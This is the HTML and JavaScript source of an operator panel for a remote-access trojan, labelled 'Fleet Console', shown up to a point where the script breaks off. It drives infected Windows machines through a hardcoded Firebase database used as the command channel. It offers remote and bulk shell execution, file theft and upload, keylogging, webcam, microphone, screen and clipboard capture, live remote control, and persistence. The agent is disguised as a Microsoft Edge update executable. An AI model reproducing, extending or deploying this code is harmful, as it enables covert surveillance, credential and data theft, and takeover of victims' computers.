<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Fleet Console</title>
<style>
:root{
  --bg:#070a0e;--bg2:#0b1118;--pn:#0e151d;--pn2:#121b25;--ln:#1b2734;--ln2:#243544;
  --tx:#c3d3e2;--dim:#6b8299;--ac:#38bdf8;--ac2:#0ea5e9;--ok:#22c55e;--wr:#f59e0b;--er:#ef4444;
  --mono:ui-monospace,"SF Mono",Menlo,Consolas,monospace;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{background:var(--bg);color:var(--tx);font:13px/1.5 var(--mono);overflow:hidden}
button{font:inherit;color:inherit;background:var(--pn2);border:1px solid var(--ln2);padding:6px 11px;border-radius:4px;cursor:pointer;transition:.12s}
button:hover{border-color:var(--ac);color:var(--ac);background:#16222e}
button:active{transform:translateY(1px)}
button:disabled{opacity:.4;cursor:not-allowed}
button.pri{background:var(--ac2);color:#04121c;border-color:var(--ac);font-weight:700}
button.pri:hover{background:var(--ac);color:#04121c}
button.dgr{border-color:#5c2626;color:#fca5a5}
button.dgr:hover{background:#2a1515;border-color:var(--er);color:var(--er)}
input,textarea,select{font:inherit;background:#05090d;border:1px solid var(--ln2);color:var(--tx);padding:6px 9px;border-radius:4px;width:100%;outline:none}
input:focus,textarea:focus,select:focus{border-color:var(--ac);box-shadow:0 0 0 2px #38bdf820}
textarea{resize:vertical}
::-webkit-scrollbar{width:9px;height:9px}
::-webkit-scrollbar-thumb{background:#22303d;border-radius:5px}
::-webkit-scrollbar-thumb:hover{background:#31465a}
::-webkit-scrollbar-track{background:transparent}

#app{display:grid;grid-template-columns:300px 1fr;grid-template-rows:48px 1fr;height:100vh}
#top{grid-column:1/-1;display:flex;align-items:center;gap:10px;padding:0 14px;background:linear-gradient(180deg,#0f1720,#0a1017);border-bottom:1px solid var(--ln)}
#brand{display:flex;align-items:center;gap:8px;font-weight:700;letter-spacing:2px;color:var(--ac);font-size:13px}
#brand i{width:9px;height:9px;border-radius:50%;background:var(--ok);box-shadow:0 0 9px var(--ok);animation:pulse 2.2s infinite}
@keyframes pulse{50%{opacity:.35}}
#search{max-width:250px}
.chip{padding:4px 10px;border:1px solid var(--ln2);border-radius:20px;cursor:pointer;color:var(--dim);font-size:11px;user-select:none}
.chip.on{background:#0d2a3a;border-color:var(--ac);color:var(--ac)}
#bulkbar{display:none;align-items:center;gap:6px;padding:4px 10px;background:#0d2030;border:1px solid #1d4a63;border-radius:5px}
#bulkbar.on{display:flex}
#bulkbar input{width:190px}

#rail{background:var(--bg2);border-right:1px solid var(--ln);overflow-y:auto;padding:8px}
#railhead{display:flex;justify-content:space-between;align-items:center;padding:2px 6px 8px;color:var(--dim);font-size:11px;letter-spacing:1px}
.dev{position:relative;padding:9px 10px 9px 26px;border:1px solid var(--ln);border-radius:6px;margin-bottom:6px;cursor:pointer;background:var(--pn);transition:.12s}
.dev:hover{border-color:#2d465c;background:var(--pn2)}
.dev.sel{border-color:var(--ac);box-shadow:inset 0 0 0 1px #38bdf840}
.dev .nm{font-weight:700;color:#e2edf7;display:flex;align-items:center;gap:6px;word-break:break-all}
.dev .sub{font-size:11px;color:var(--dim);margin-top:2px;display:flex;gap:6px;flex-wrap:wrap}
.dev .dot{position:absolute;left:9px;top:12px;width:7px;height:7px;border-radius:50%;background:var(--er)}
.dev.on .dot{background:var(--ok);box-shadow:0 0 7px var(--ok)}
.dev .ck{position:absolute;left:8px;bottom:8px;width:12px;height:12px;accent-color:var(--ac);cursor:pointer}
.badge{font-size:9px;padding:1px 5px;border-radius:3px;border:1px solid #3f2f10;background:#241c08;color:var(--wr);letter-spacing:.5px}
.badge.adm{border-color:#3b2a5c;background:#1e1430;color:#c4a5f5}
.tag{font-size:9px;padding:1px 5px;border-radius:3px;background:#12293a;color:#7dd3fc;border:1px solid #1d4a63}

#main{overflow:hidden;display:flex;flex-direction:column}
#empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;color:var(--dim)}
#empty b{font-size:17px;color:#4b6478;letter-spacing:3px}
#devview{display:none;flex:1;flex-direction:column;overflow:hidden}
#devview.on{display:flex}

#devhead{padding:11px 16px;border-bottom:1px solid var(--ln);background:var(--pn);display:flex;align-items:center;gap:14px;flex-wrap:wrap}
#devhead h2{font-size:15px;color:#e8f2fb;letter-spacing:.5px}
#devhead .meta{display:flex;gap:12px;font-size:11px;color:var(--dim);flex-wrap:wrap}
#devhead .meta b{color:var(--tx)}
#devhead .act{margin-left:auto;display:flex;gap:6px;flex-wrap:wrap}

#tabs{display:flex;gap:2px;padding:0 10px;background:var(--bg2);border-bottom:1px solid var(--ln);overflow-x:auto}
#tabs button{background:none;border:none;border-bottom:2px solid transparent;border-radius:0;padding:9px 13px;color:var(--dim);white-space:nowrap;font-size:12px}
#tabs button:hover{color:var(--tx);background:#111a23}
#tabs button.on{color:var(--ac);border-bottom-color:var(--ac)}

#body{flex:1;overflow:auto;padding:14px 16px}
.pane{display:none}.pane.on{display:block}

pre{background:#04080c;border:1px solid var(--ln);border-radius:5px;padding:10px;overflow:auto;max-height:460px;white-space:pre-wrap;word-break:break-all;color:#a8c4d8;font-size:12px}
.row{display:flex;gap:7px;align-items:center;margin-bottom:9px;flex-wrap:wrap}
.row input{flex:1;min-width:120px}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.card{background:var(--pn);border:1px solid var(--ln);border-radius:6px;padding:11px;margin-bottom:10px}
.card h4{font-size:11px;letter-spacing:1.4px;color:var(--ac);margin-bottom:9px;text-transform:uppercase;font-weight:600}

table{width:100%;border-collapse:collapse;font-size:12px}
th{text-align:left;color:var(--ac);font-size:10px;letter-spacing:1px;padding:5px;border-bottom:1px solid var(--ln2);position:sticky;top:0;background:var(--bg)}
td{padding:4px 5px;border-bottom:1px solid #131e28;word-break:break-all}
tr:hover td{background:#0d151d}
.tw{max-height:430px;overflow:auto;border:1px solid var(--ln);border-radius:5px}

#img{border:1px solid var(--ln2);border-radius:5px;max-width:100%;cursor:crosshair;background:#04080c}
#frame{display:flex;justify-content:center;background:#04080c;border:1px solid var(--ln);border-radius:5px;padding:6px;min-height:200px;align-items:center}
#frame img{max-height:64vh}

#kl{font-size:12px;line-height:1.7}
#kl .e{padding:2px 0;border-bottom:1px dotted #14202b}
#kl .t{color:#4f6b82;margin-right:8px;font-size:10px}
#kl .u{color:#7dd3fc;margin-right:6px;font-size:10px}

#reslog .r{border-left:2px solid var(--ln2);padding:5px 9px;margin-bottom:5px;background:var(--pn);border-radius:0 4px 4px 0;cursor:pointer}
#reslog .r.ok{border-left-color:var(--ok)}
#reslog .r.bad{border-left-color:var(--er)}
#reslog .h{display:flex;gap:8px;font-size:10px;color:var(--dim);margin-bottom:3px}
#reslog .c{font-size:11px;color:#8fb3cd;white-space:pre-wrap;word-break:break-all;max-height:120px;overflow:hidden}
#reslog .r.open .c{max-height:none}

#status{height:26px;display:flex;align-items:center;gap:12px;padding:0 14px;background:var(--pn);border-top:1px solid var(--ln);font-size:11px;color:var(--dim)}
#status .l{color:var(--ac)}

#toasts{position:fixed;bottom:38px;right:16px;display:flex;flex-direction:column;gap:7px;z-index:200;max-width:340px}
.toast{padding:9px 13px;border-radius:5px;background:#0f1c26;border:1px solid var(--ln2);font-size:12px;animation:in .18s;box-shadow:0 6px 22px #0009}
.toast.ok{border-color:#1f5f3a;background:#0b1f15;color:#86efac}
.toast.er{border-color:#6b2222;background:#1f0e0e;color:#fca5a5}
@keyframes in{from{opacity:0;transform:translateX(24px)}}

#modal{position:fixed;inset:0;background:#040709e8;display:none;align-items:center;justify-content:center;z-index:300;padding:24px}
#modal.on{display:flex}
#modal img{max-width:94vw;max-height:90vh;border:1px solid var(--ln2);border-radius:6px}
#modalbar{position:absolute;top:14px;right:18px;display:flex;gap:8px}
.prog{height:5px;background:#0a1219;border-radius:3px;overflow:hidden;border:1px solid var(--ln)}
.prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--ac2),var(--ac));transition:width .2s}
.hint{font-size:10px;color:#4b6478}
</style>
</head>
<body>
<div id="app">
  <header id="top">
    <div id="brand"><i></i>FLEET</div>
    <input id="search" placeholder="search host / user / ip  (Ctrl+K)" autocomplete="off">
    <span class="chip on" data-f="all">all</span>
    <span class="chip" data-f="on">online</span>
    <span class="chip" data-f="adm">admin</span>
    <div id="bulkbar">
      <span id="bcount" style="color:var(--ac)">0</span>
      <input id="bcmd" placeholder="bulk command" onkeydown="if(event.key==='Enter')bulkRun()">
      <button class="pri" onclick="bulkRun()">run</button>
      <button onclick="bulkQuick('ping')">ping</button>
      <button onclick="bulkQuick('shot')">shot</button>
      <button onclick="clearSel()">clear</button>
    </div>
    <div style="flex:1"></div>
    <button id="pausebtn" onclick="togglePause()">pause</button>
    <button onclick="renderRail()">refresh</button>
  </header>

  <aside id="rail">
    <div id="railhead"><span>DEVICES</span><span id="cnt">0</span></div>
    <div id="list"></div>
  </aside>

  <main id="main">
    <div id="empty"><b>NO DEVICE SELECTED</b><span>pick a machine from the rail</span></div>
    <div id="devview">
      <div id="devhead">
        <h2 id="dname">—</h2>
        <div class="meta" id="dmeta"></div>
        <div class="act">
          <button onclick="send('ping')">ping</button>
          <button onclick="send('info')">info</button>
          <button onclick="send('shot')">shot</button>
          <button onclick="tagDev()">tag</button>
          <button onclick="noteDev()">note</button>
          <button class="dgr" onclick="restartAgent()">restart</button>
        </div>
      </div>
      <div id="tabs"></div>
      <div id="body">
        <div class="pane on" id="p-console">
          <div class="row"><input id="icmd" placeholder="shell command — Enter to send" onkeydown="if(event.key==='Enter')runCmd()"><button class="pri" onclick="runCmd()">exec</button></div>
          <pre id="cout">ready.</pre>
        </div>
        <div class="pane" id="p-files">
          <div class="row"><input id="fpath" value="C:\" onkeydown="if(event.key==='Enter')ls()"><button onclick="ls()">go</button><button onclick="upOne()">up</button><button onclick="pickFile()">upload</button><input type="file" id="finput" style="display:none" onchange="doUpload(this.files[0])"></div>
          <div class="tw"><table><thead><tr><th>name</th><th>size</th><th>modified</th><th></th></tr></thead><tbody id="flist"></tbody></table></div>
          <div id="uprog" style="display:none;margin-top:9px"><div class="prog"><i id="upbar"></i></div><div class="hint" id="uptxt"></div></div>
        </div>
        <div class="pane" id="p-live">
          <div class="row"><button class="pri" id="livebtn" onclick="liveToggle()">start live</button><span class="hint" id="linfo">idle</span></div>
          <div class="row"><input id="ltext" placeholder="type text then Enter" onkeydown="if(event.key==='Enter'){liveText();event.preventDefault()}"><select id="lkey" style="max-width:130px" onchange="if(this.value){liveKey(this.value);this.value=''}"><option value="">key…</option><option value="13">Enter</option><option value="9">Tab</option><option value="27">Esc</option><option value="8">Backspace</option><option value="46">Del</option><option value="37">←</option><option value="38">↑</option><option value="39">→</option><option value="40">↓</option><option value="91">Win</option><option value="17">Ctrl</option><option value="18">Alt</option></select><select id="lbtn" style="max-width:110px"><option value="left">left</option><option value="right">right</option><option value="mid">mid</option></select></div>
          <div id="frame"><img id="img" alt=""></div>
        </div>
        <div class="pane" id="p-keys">
          <div class="row"><button class="pri" onclick="send('keylog',{on:true})">start</button><button onclick="send('keylog',{on:false})">stop</button><button onclick="clearKl()">clear</button><input id="klf" placeholder="filter" oninput="renderKl()"></div>
          <div id="kl"></div>
        </div>
        <div class="pane" id="p-capture">
          <div class="row"><button onclick="send('shot')">screenshot</button><button onclick="send('cam')">webcam</button><button onclick="send('audio',{sec:8})">mic 8s</button></div>
          <div id="gal" class="grid3"></div>
        </div>
        <div class="pane" id="p-proc">
          <div class="row"><button onclick="send('proc')">refresh</button><input id="pf" placeholder="filter" oninput="renderProc()"></div>
          <div class="tw"><table><thead><tr><th>pid</th><th>name</th><th>user</th><th>mem</th><th></th></tr></thead><tbody id="plist"></tbody></table></div>
        </div>
        <div class="pane" id="p-svc">
          <div class="card"><h4>service</h4><div class="row"><input id="sname" placeholder="service name"><button onclick="svc('query')">query</button><button onclick="svc('start')">start</button><button onclick="svc('stop')">stop</button><button class="dgr" onclick="svc('disable')">disable</button></div></div>
          <pre id="sout">—</pre>
        </div>
        <div class="pane" id="p-reg">
          <div class="card"><h4>registry</h4><div class="row"><input id="rpath" placeholder="HKLM\SOFTWARE\..."><button onclick="regRead()">read</button></div><div class="row"><input id="rname" placeholder="value name"><input id="rval" placeholder="value"><button onclick="regWrite()">write</button></div></div>
          <pre id="rout">—</pre>
        </div>
        <div class="pane" id="p-clip">
          <div class="row"><button onclick="send('clip')">read clipboard</button><button onclick="clipSet()">write clipboard</button></div>
          <pre id="clipout">—</pre>
        </div>
        <div class="pane" id="p-ops">
          <div class="grid2">
            <div class="card"><h4>message box</h4><input id="mtitle" placeholder="title" style="margin-bottom:6px"><textarea id="mtext" rows="2" placeholder="text"></textarea><div class="row" style="margin-top:7px"><button onclick="send('msg',{title:mtitle.value,text:mtext.value})">show</button></div></div>
            <div class="card"><h4>wallpaper</h4><input id="wpath" placeholder="C:\path\image.jpg"><div class="row" style="margin-top:7px"><button onclick="send('wall',{path:wpath.value})">set</button></div></div>
            <div class="card"><h4>power</h4><div class="row"><button onclick="send('lock')">lock</button><button onclick="send('power',{mode:'r'})">reboot</button><button class="dgr" onclick="send('power',{mode:'s'})">shutdown</button></div></div>
            <div class="card"><h4>agent</h4><div class="row"><button onclick="send('persist')">reinstall</button><button class="dgr" onclick="confirmUninstall()">uninstall</button></div></div>
          </div>
        </div>
        <div class="pane" id="p-res">
          <div class="row"><button onclick="results=[];renderRes()">clear</button><select id="rf" style="max-width:130px" onchange="renderRes()"><option value="all">all</option><option value="ok">ok</option><option value="bad">failed</option></select></div>
          <div id="reslog"></div>
        </div>
      </div>
      <div id="status"><span>db</span><span class="l" id="sdb">linked</span><span>|</span><span>queue</span><span class="l" id="sq">0</span><span>|</span><span id="sdev">—</span></div>
    </div>
  </main>
</div>

<div id="toasts"></div>
<div id="modal" onclick="if(event.target.id==='modal')closeModal()"><div id="modalbar"><button onclick="closeModal()">close</button></div><img id="mimg"></div>

<script>
const FBDEF="https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app";
let FB=localStorage.getItem("fb")||FBDEF;
const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
let cur=null,devs={},paused=false,live=false,liveT=null,sel=new Set(),results=[],filter="all",q="";
let resCache={},procCache=[],klCache={},screenRes={};
const pending=new Map();

/* ---------- transport ---------- */
async function api(m,p,b,retry=2){
  const o={method:m};
  if(b!==undefined)o.body=JSON.stringify(b);
  for(let i=0;i<=retry;i++){
    try{
      const r=await fetch(FB+"/"+p+".json",o);
      if(r.status===401){toast("401 — check rules","er");return null}
      if(!r.ok&&i<retry){await sleep(400);continue}
      const t=await r.text();
      return t?JSON.parse(t):null;
    }catch(e){ if(i===retry){toast("network error","er");return null} await sleep(500)}
  }
}
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const put=(p,b)=>api("PUT",p,b), get=p=>api("GET",p), patch=(p,b)=>api("PATCH",p,b), del=p=>api("DELETE",p);

/* ---------- toast / modal ---------- */
function toast(m,t=""){const d=document.createElement("div");d.className="toast "+t;d.textContent=m;$("#toasts").appendChild(d);setTimeout(()=>{d.style.opacity=0;setTimeout(()=>d.remove(),250)},3200)}
function modal(src){$("#mimg").src=src;$("#modal").classList.add("on")}
function closeModal(){$("#modal").classList.remove("on")}

/* ---------- task bus ---------- */
let seq=0;
function tid(){return Date.now().toString(36)+"-"+(seq++).toString(36)}
async function send(c,args={},label){
  if(!cur)return null;
  const t=tid();
  const task={c,st:"queued",ts:Math.floor(Date.now()/1000),...args};
  pending.set(t,{c,label:label||c,args});
  $("#sq").textContent=pending.size;
  await put("tasks/"+cur+"/"+t,task);
  watch(t,0);
  return t;
}
async function watch(t,n){
  if(!pending.has(t))return;
  const r=await get("results/"+cur+"/"+t);
  if(r){pending.delete(t);$("#sq").textContent=pending.size;logRes(t,pending.get(t)||{c:"?"},r);route(t,r);return}
  if(n>75){pending.delete(t);$("#sq").textContent=pending.size;toast("timeout: "+t,"er");return}
  setTimeout(()=>watch(t,n+1),900);
}
function logRes(t,meta,r){results.unshift({t,cmd:meta.c,label:meta.label,ok:!!r.ok,out:r.out,ts:Date.now()});if(results.length>250)results.pop();renderRes()}
function route(t,r){
  const m=pending.get(t);
  const pane=activeTab();
  const o=r.out;
  if(pane==="console"||!pane){ if(o!==undefined)$("#cout").textContent=str(o) }
  if(Array.isArray(o)&&pane==="files")renderFiles(o);
  if(pane==="proc"&&typeof o==="string")parseProc(o);
  if(pane==="svc")$("#sout").textContent=str(o);
  if(pane==="reg")$("#rout").textContent=str(o);
  if(pane==="clip")$("#clipout").textContent=str(o);
  if(pane==="capture"&&isB64(o))galAdd(o);
  if(m&&m.c==="info"&&typeof o==="object")renderMeta(o);
  if(m&&m.c==="proc"&&typeof o==="string")parseProc(o);
  if(m&&m.c==="dl"){}
}
const str=o=>typeof o==="string"?o:JSON.stringify(o,null,1);
const isB64=o=>typeof o==="string"&&o.length>800&&/^[A-Za-z0-9+/=\s]+$/.test(o.slice(0,120));

/* ---------- rail ---------- */
function renderRail(){
  const list=$("#list");
  const now=Date.now()/1000;
  const keys=Object.keys(devs).filter(id=>{
    const v=devs[id];if(!v)return false;
    const on=now-(v.last||0)<50;
    if(filter==="on"&&!on)return false;
    if(filter==="adm"&&!v.admin)return false;
    if(q){const s=(v.host||"")+(v.user||"")+(v.ip||"");if(!s.toLowerCase().includes(q))return false}
    return true;
  }).sort((a,b)=>(devs[b].last||0)-(devs[a].last||0));
  list.innerHTML="";
  let on=0;
  Object.values(devs).forEach(v=>{if(v&&now-(v.last||0)<50)on++});
  $("#cnt").textContent=on+" / "+Object.keys(devs).length;
  if(!keys.length){list.innerHTML='<div class="hint" style="padding:12px;text-align:center">no matches</div>';return}
  keys.forEach(id=>{
    const v=devs[id],isOn=now-(v.last||0)<50;
    const d=document.createElement("div");
    d.className="dev"+(isOn?" on":"")+(id===cur?" sel":"");
    const tag=localStorage.getItem("tag_"+id);
    d.innerHTML=`<span class="dot"></span>
      <input type="checkbox" class="ck" ${sel.has(id)?"checked":""} data-id="${id}">
      <div class="nm">${esc(v.host||id)}${v.admin?'<span class="badge adm">ADMIN</span>':""}${tag?`<span class="tag">${esc(tag)}</span>`:""}</div>
      <div class="sub"><span>${esc(v.user||"?")}</span><span>${esc(v.ip||"")}</span><span>${isOn?"now":ago(v.last)}</span></div>`;
    d.onclick=e=>{ if(e.target.classList.contains("ck")){toggleSel(id,e.target.checked);return} open(id) };
    list.appendChild(d);
  });
}
const ago=t=>{if(!t)return "never";const s=Date.now()/1000-t;if(s<60)return Math.floor(s)+"s";if(s<3600)return Math.floor(s/60)+"m";if(s<86400)return Math.floor(s/3600)+"h";return Math.floor(s/86400)+"d"};
const esc=s=>String(s??"").replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));

function toggleSel(id,on){on?sel.add(id):sel.delete(id);$("#bulkbar").classList.toggle("on",sel.size>0);$("#bcount").textContent=sel.size}
function clearSel(){sel.clear();$$(".ck").forEach(c=>c.checked=false);$("#bulkbar").classList.remove("on")}
async function bulkRun(){
  const cmd=$("#bcmd").value.trim();if(!cmd||!sel.size)return;
  const targets=[...sel];
  toast("running on "+targets.length+" devices");
  const keep=cur;
  for(const id of targets){cur=id;await send("exec",{cmd},cmd)}
  cur=keep;
}
async function bulkQuick(c){if(!sel.size)return;const keep=cur;for(const id of sel){cur=id;await send(c)}cur=keep;toast(c+" sent to "+sel.size)}

/* ---------- device open ---------- */
function open(id){
  cur=id;closeModal();stopLive();
  $("#empty").style.display="none";$("#devview").classList.add("on");
  localStorage.setItem("last",id);
  tabs();renderHead();$("#cout").textContent="ready.";
  $("#sdev").textContent=devs[id]?.host||id;
  if(!devs[id]?.info)send("info");
  if(!screenRes[id])resolveRes();
  renderRail();
}
function renderHead(){
  const v=devs[cur]||{};
  $("#dname").textContent=v.host||cur;
  const i=v.info||{};
  $("#dmeta").innerHTML=[
    v.admin?'<span class="badge adm">ADMIN</span>':'',
    `<span>${esc(v.user||"?")}</span>`,
    `<span>${esc(v.ip||"")}</span>`,
    i.os?`<span>${esc(String(i.os).split("\n")[0])}</span>`:"",
    i.av?`<span>av: ${esc(String(i.av).trim().slice(0,40))}</span>`:"",
    `<span>last ${ago(v.last)}</span>`
  ].filter(Boolean).join("");
  const n=localStorage.getItem("note_"+cur);
  if(n)$("#dmeta").innerHTML+=`<span style="color:var(--wr)">📝 ${esc(n)}</span>`;
}
function renderMeta(i){ if(!cur)return; devs[cur].info=i; renderHead() }
async function resolveRes(){
  const t=await send("exec",{cmd:'wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution'});
  setTimeout(async()=>{
    const r=await get("results/"+cur+"/"+t);const m=String(r?.out||"").match(/(\d+)\s+(\d+)/);
    if(m)screenRes[cur]={w:+m[1],h:+m[2]};
  },1600);
}

/* ---------- tabs ---------- */
const TABS=[["console","console"],["files","files"],["live","live"],["keys","keylog"],["capture","capture"],["proc","processes"],["svc","services"],["reg","registry"],["clip","clipboard"],["ops","ops"],["res","results"]];
function tabs(){
  const t=$("#tabs");t.innerHTML="";
  TABS.forEach(([k,n],i)=>{
    const b=document.createElement("button");b.textContent=n;b.dataset.k=k;
    if(i===0)b.classList.add("on");
    b.onclick=()=>{$$(".pane").forEach(p=>p.classList.remove("on"));$$("#tabs button").forEach(x=>x.classList.remove("on"));
      $("#p-"+k).classList.add("on");b.classList.add("on");
      if(k==="keys")loadKl();if(k==="proc"&&!procCache.length)send("proc");if(k==="res")renderRes();
      if(k!=="live"&&live)stopLive()};
    t.appendChild(b);
  });
}
const activeTab=()=>$("#tabs button.on")?.dataset.k;

/* ---------- console ---------- */
function runCmd(){const c=$("#icmd").value;if(!c)return;send("exec",{cmd:c},c);$("#icmd").value=""}

/* ---------- files ---------- */
async function ls(){const p=$("#fpath").value||"C:\\";const t=await send("ls",{path:p},"ls "+p);
  setTimeout(async()=>{const r=await get("results/"+cur+"/"+t);if(r)renderFiles(r.out)},1200)}
function renderFiles(arr){
  const tb=$("#flist");tb.innerHTML="";
  if(!Array.isArray(arr)){tb.innerHTML=`<tr><td colspan="4">${esc(str(arr))}</td></tr>`;return}
  arr.forEach(f=>{
    const tr=document.createElement("tr");
    tr.innerHTML=`<td>${f.d?"📁":"📄"} ${esc(f.n)}</td><td>${f.d?"":kb(f.s)}</td><td>${f.m?new Date(f.m*1000).toLocaleString():"—"}</td><td></td>`;
    const td=tr.lastElementChild;
    if(f.d){const b=btn("open",()=>{$("#fpath").value=join($("#fpath").value,f.n);ls()});td.appendChild(b)}
    else{td.appendChild(btn("get",()=>download(f.n)))}
    td.appendChild(btn("del",()=>{send("exec",{cmd:`del /f /q "${join($("#fpath").value,f.n)}"`}, "del "+f.n);setTimeout(ls,1200)}));
    tb.appendChild(tr);
  });
}
const kb=n=>n>1048576?(n/1048576).toFixed(1)+" MB":n>1024?(n/1024).toFixed(1)+" KB":n+" B";
const join=(a,b)=>a.replace(/\\$/,"")+"\\"+b;
function upOne(){const p=$("#fpath").value.replace(/\\[^\\]*$/,"");$("#fpath").value=p||"C:\\";ls()}
function pickFile(){$("#finput").click()}
function btn(t,fn){const b=document.createElement("button");b.textContent=t;b.style.padding="2px 7px";b.style.fontSize="11px";b.onclick=fn;return b}

async function download(name){
  const path=join($("#fpath").value,name);
  const uid="d"+Date.now().toString(36);
  toast("fetching "+name);
  await send("dl",{path,uid},"dl "+name);
  let meta=null,tries=0;
  while(tries++<90){
    await sleep(700);
    meta=await get("xfer/"+uid+"/meta");
    if(meta&&meta.chunks>0){await sleep(900);meta=await get("xfer/"+uid+"/meta");break}
  }
  if(!meta||!meta.chunks){toast("transfer failed","er");return}
  const parts=[];
  for(let i=0;i<meta.chunks;i++){
    const c=await get(`xfer/${uid}/c/${i}`);
    if(c)parts.push(b64(c));
  }
  const blob=new Blob(parts,{type:"application/octet-stream"});
  const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download=meta.name||name;a.click();
  toast("saved "+name,"ok");
  del("xfer/"+uid);
}
const b64=s=>{const bin=atob(s.replace(/\s/g,""));const u=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);return u};

async function doUpload(file){
  if(!file)return;
  const dest=join($("#fpath").value,file.name);
  const uid="u"+Date.now().toString(36);
  const CH=180000,total=Math.ceil(file.size/CH);
  $("#uprog").style.display="block";
  for(let i=0;i<total;i++){
    const slice=file.slice(i*CH,(i+1)*CH);
    const buf=new Uint8Array(await slice.arrayBuffer());
    let bin="";for(const b of buf)bin+=String.fromCharCode(b);
    await put(`xfer/${uid}/c/${i}`,btoa(bin));
    $("#upbar").style.width=((i+1)/total*100)+"%";
    $("#uptxt").textContent=`${i+1}/${total} chunks`;
  }
  await put(`xfer/${uid}/meta`,{name:file.name,size:file.size,chunks:total});
  await send("ul",{uid,path:dest},"ul "+file.name);
  toast("uploaded "+file.name,"ok");
  setTimeout(()=>{$("#uprog").style.display="none";$("#upbar").style.width=0;ls()},1500);
}

/* ---------- live ---------- */
function liveToggle(){live?stopLive():startLive()}
async function startLive(){
  if(!cur)return;
  await send("live",{on:true},"live on");
  live=true;$("#livebtn").textContent="stop live";
  liveT=setInterval(async()=>{
    const f=await get("live/"+cur+"/frame");
    if(f&&f.d){$("#img").src="data:image/jpeg;base64,"+f.d;$("#linfo").textContent="frame "+new Date(f.ts).toLocaleTimeString()}
  },450);
}
async function stopLive(){
  if(!live)return;
  live=false;clearInterval(liveT);$("#livebtn").textContent="start live";
  if(cur)await send("live",{on:false},"live off");
}
function screenPt(e){
  const i=$("#img"),r=i.getBoundingClientRect();
  const res=screenRes[cur]||{w:1920,h:1080};
  const x=Math.round((e.clientX-r.left)/r.width*res.w);
  const y=Math.round((e.clientY-r.top)/r.height*res.h);
  return {x,y,b:$("#lbtn").value};
}
$("#img").addEventListener("click",async e=>{
  if(!live)return;const p=screenPt(e);
  await put(`live/${cur}/input/${Date.now()}x`,{t:"mouse",x:p.x,y:p.y,b:p.b,d:true,ts:Date.now()});
  setTimeout(()=>put(`live/${cur}/input/${Date.now()}y`,{t:"mouse",x:p.x,y:p.y,b:p.b,d:false,ts:Date.now()+1}),80);
});
$("#img").addEventListener("contextmenu",async e=>{
  e.preventDefault();if(!live)return;const p=screenPt(e);p.b="right";
  await put(`live/${cur}/input/${Date.now()}r`,{t:"mouse",x:p.x,y:p.y,b:"right",d:true,ts:Date.now()});
  setTimeout(()=>put(`live/${cur}/input/${Date.now()}s`,{t:"mouse",x:p.x,y:p.y,b:"right",d:false,ts:Date.now()+1}),80);
});
async function liveText(){const s=$("#ltext").value;if(!s||!live)return;
  await put(`live/${cur}/input/${Date.now()}`,{t:"text",s,ts:Date.now()});$("#ltext").value=""}
async function liveKey(v){if(!live)return;await put(`live/${cur}/input/${Date.now()}`,{t:"key",vk:+v,ts:Date.now()})}

/* ---------- keylog ---------- */
async function loadKl(){klCache=await get("keylog/"+cur)||{};renderKl()}
function renderKl(){
  const f=$("#klf").value.toLowerCase();
  const rows=Object.entries(klCache).sort((a,b)=>+a[0]-+b[0]);
  $("#kl").innerHTML=rows.filter(([,v])=>!f||(v.t||"").toLowerCase().includes(f))
    .map(([ts,v])=>`<div class="e"><span class="t">${new Date(+ts).toLocaleTimeString()}</span><span class="u">${esc(v.u||"")}</span>${esc(v.t||"")}</div>`).join("")||'<div class="hint">empty</div>';
}
async function clearKl(){await del("keylog/"+cur);klCache={};renderKl()}

/* ---------- capture gallery ---------- */
function galAdd(src){
  const d=document.createElement("div");d.className="card";
  d.innerHTML=`<img src="data:image/jpeg;base64,${src}" style="width:100%;border-radius:4px;cursor:zoom-in">`;
  d.firstChild.onclick=()=>modal(d.firstChild.src);
  $("#gal").prepend(d);
  if($("#gal").children.length>12)$("#gal").lastChild.remove();
}

/* ---------- processes ---------- */
function parseProc(text){
  procCache=text.split("\n").slice(1).map(l=>{
    const m=l.match(/^"([^"]+)","(\d+)","[^"]*","[^"]*","(\d+)[^"]*"/);
    return m?{name:m[1],pid:m[2],mem:m[3]}:null;
  }).filter(Boolean);
  renderProc();
}
function renderProc(){
  const f=$("#pf").value.toLowerCase();
  $("#plist").innerHTML=procCache.filter(p=>!f||p.name.toLowerCase().includes(f))
    .map(p=>`<tr><td>${p.pid}</td><td>${esc(p.name)}</td><td></td><td>${kb(+p.mem*1024)}</td><td></td></tr>`)
    .join("");
  $$("#plist tr").forEach((tr,i)=>{
    const p=procCache.filter(x=>!f||x.name.toLowerCase().includes(f))[i];
    tr.lastElementChild.appendChild(btn("kill",()=>{send("kill",{pid:p.pid},"kill "+p.pid);setTimeout(()=>send("proc"),900)}));
  });
}

/* ---------- svc / reg / clip ---------- */
function svc(op){const n=$("#sname").value;if(!n)return;send("svc",{op,name:n},op+" "+n)}
function regRead(){send("reg",{op:"read",path:$("#rpath").value},"reg read")}
function regWrite(){send("reg",{op:"write",path:$("#rpath").value,name:$("#rname").value,val:$("#rval").value},"reg write")}
function clipSet(){const t=prompt("clipboard text");if(t!==null)send("clip",{op:"set",text:t},"clip set")}

/* ---------- ops ---------- */
function confirmUninstall(){if(confirm("uninstall agent from this machine?"))send("uninstall")}
function restartAgent(){send("exec",{cmd:'start "" "%ProgramData%\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"'})}
function tagDev(){const t=prompt("tag",localStorage.getItem("tag_"+cur)||"");if(t===null)return;t?localStorage.setItem("tag_"+cur,t):localStorage.removeItem("tag_"+cur);renderRail()}
